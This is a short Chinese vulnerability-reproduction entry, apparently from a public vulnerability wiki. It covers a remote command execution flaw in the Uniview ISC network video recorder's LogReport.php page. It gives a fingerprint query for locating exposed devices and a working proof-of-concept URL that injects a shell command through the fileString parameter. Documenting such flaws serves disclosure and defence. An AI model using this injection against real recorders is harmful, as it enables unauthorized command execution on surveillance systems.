---
title: "浙江宇视科技 网络视频录像机 ISC LogReport.php 远程命令执行漏洞"
date: 2026-10-18 09:16:21
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "浙江宇视科技-网络视频录像机-ISC"
tags:
  - "浙江宇视科技-网络视频录像机-ISC"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

浙江宇视科技 网络视频录像机 ISC /Interface/LogReport/LogReport.php 页面，fileString 参数过滤不严格，导致攻击者可执行任意命令

## 漏洞影响

```
浙江宇视科技 网络视频录像机 ISC
```

## 网络测绘

```
app="uniview-ISC"
```

## 漏洞复现

登录页面

![image-20220519183432893](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191834953.png)

验证POC

```
/Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;id>1.txt
```

![image-20220519183528302](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191835400.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E6%B5%99%E6%B1%9F%E5%AE%87%E8%A7%86%E7%A7%91%E6%8A%80-%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BA-ISC-LogReport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
